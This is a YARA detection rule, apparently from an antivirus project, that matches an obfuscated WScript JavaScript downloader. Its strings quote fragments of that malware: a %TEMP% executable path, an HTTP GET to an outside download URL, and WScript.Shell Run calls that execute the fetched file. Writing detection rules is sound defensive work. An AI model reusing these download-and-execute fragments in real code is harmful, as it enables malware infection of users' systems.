rule sig_20160328_1e4203a5151b8fd7c202abd674b8ab5b {
  meta:
    description = "datamaliciousorder - file 20160328_1e4203a5151b8fd7c202abd674b8ab5b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "56b0eb1476bbee04d936efe935c817d235a4917211090564a8e5335397c4b3e8"

  strings:
    $s1  = "function Xxkifh() {return Rvvkpdo[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"MXkxOmNbrfZ1.exe\";};" fullword ascii
    $s2  = "Ezwefwobsj[Honwqt](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "do {WScript[Xhuwvdpvq](Lkcyxjqps() * 11)} while (Ezwefwobsj[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Dyoaer(Fjoxeqv, Bkhydkjc){return Fjoxeqv - Bkhydkjc;};" fullword ascii
    $s5  = "var Rvvkpdo = function Bbdvjapbvw() {return WScript[Zaxlgvuv](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Ldgpel() {return ((Zzhdpxzb == true) && (Zzhdpxzb == Tbfxdce)) ? 1 : Nfnhot;};" fullword ascii
    $s7  = "function Oyjiyaar(Oghwwvnzm){Rvvkpdo[\"Run\"](Oghwwvnzm, Nfnhot, Nfnhot);};" fullword ascii
    $s8  = "function Lkcyxjqps(){return 22;};" fullword ascii
    $s9  = "return Dyoaer(Hkyyi, Tdvvh);" fullword ascii
    $s10 = "function Ksvanfki(Izdxwfw) {var Phagzpcwx = (1, 2, 3, 4, 5, Izdxwfw); return Phagzpcwx;};" fullword ascii
    $s11 = " while (Ehqbjb){" fullword ascii
    $s12 = "function Dqfmkfwnaa()" fullword ascii
    $s13 = "var Zzhdpxzb = false;" fullword ascii
    $s14 = "var Vhitv = false;" fullword ascii
    $s15 = "function Gghnw(){return Ilieubuf;};" fullword ascii
    $s16 = "Tbfxdce = true; " fullword ascii
    $s17 = "Zzhdpxzb = true; " fullword ascii
    $s18 = "function Plrqvagkd(){return Zaxlgvuv;};" fullword ascii
    $s19 = "var Tbfxdce = false;" fullword ascii
    $s20 = "var Mvonjvp = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}